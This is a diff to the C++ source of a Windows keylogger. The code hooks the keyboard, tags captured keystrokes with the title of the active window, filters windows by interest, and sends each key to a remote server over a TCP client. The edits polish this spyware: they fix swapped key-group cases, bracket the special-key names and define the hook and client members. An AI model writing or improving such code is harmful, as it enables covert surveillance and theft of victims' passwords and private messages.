@@ -16,12 +16,18 @@ const std::vector<BYTE> Keylogger::specialKeys = {
 };
 
 const std::vector<std::wstring> Keylogger::specialKeyNames = {
-	L"LMB", L"RMB", L"MMB", L"BS", L"TAB", L"RET", L"CTRL", L"ALT", L"ESC", L"PGUP", L"PGDWN", L"END", L"HOME", L"LARROW", L"RARROW", L"UARROW", L"DARROW", L"INS", L"DEL"
+	L"[LMB]", L"[RMB]", L"[MMB]", L"[BS]", L"[TAB]", L"[ENTER]", L"[CTRL]", L"[ALT]", L"[ESC]", L"[PGUP]", L"[PGDWN]", L"[END]", L"[HOME]", L"[LARROW]", L"[RARROW]",
+	L"[UARROW]", L"[DARROW]", L"[INS]", L"[DEL]"
 };
 
 const std::vector<std::vector<BYTE>> Keylogger::keySets = { valueKeys, specialKeys };
 
 BYTE Keylogger::keyState[256] = { 0 };
+
+Filters* Keylogger::filters;
+TcpClient* Keylogger::client;
+HHOOK Keylogger::hHook;
+std::wstring Keylogger::previousWindowTitle;
 
 Keylogger::Keylogger(TcpClient *client, Filters *filters)
 {
@@ -79,8 +85,8 @@ LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPAR
 		int keyGroup;
 		int keyPos;
 		bool isTracedKey = false;
-		for(int i = 0; i < keySets.size(); i++)
-			for (int j = 0; j < keySets[i].size(); j++)
+		for(UINT i = 0; i < keySets.size(); i++)
+			for (UINT j = 0; j < keySets[i].size(); j++)
 			{
 				if (keySets[i][j] == key->vkCode)
 				{
@@ -107,7 +113,7 @@ LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPAR
 				{
 					isWorthy = true;
 					previousWindowTitle = title;
-					std::wstring msg = L"\n[" + title + L"]\n\t";
+					std::wstring msg = L"\n\n[" + title + L"]\n\t";
 					client->SendBuff(msg);
 				}
 				else isWorthy = false;
@@ -118,11 +124,11 @@ LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPAR
 			if(isWorthy)
 				switch (keyGroup)
 				{
-				case 0:
+				case 1:
 					client->SendBuff(specialKeyNames[keyPos]);
 					break;
 
-				case 1:
+				case 0:
 					wchar_t wcharBuff[2];
 					ToUnicodeEx(key->vkCode, 0, keyState, wcharBuff, 2, 0, hLang);
 					client->SendBuff(wcharBuff[0]);
